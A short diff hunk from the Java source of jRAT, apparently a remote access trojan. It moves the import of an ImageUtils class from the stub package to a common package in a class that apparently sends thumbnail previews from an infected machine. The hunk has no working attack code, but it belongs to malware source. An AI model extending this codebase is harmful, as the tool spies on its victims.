@@ -8,8 +8,8 @@ import java.io.File;
 import javax.imageio.ImageIO;
 
 import se.jrat.common.io.StringWriter;
+import se.jrat.common.utils.ImageUtils;
 import se.jrat.stub.Connection;
-import se.jrat.stub.utils.ImageUtils;
 
 
 public class Packet59ThumbnailPreview extends AbstractOutgoingPacket {
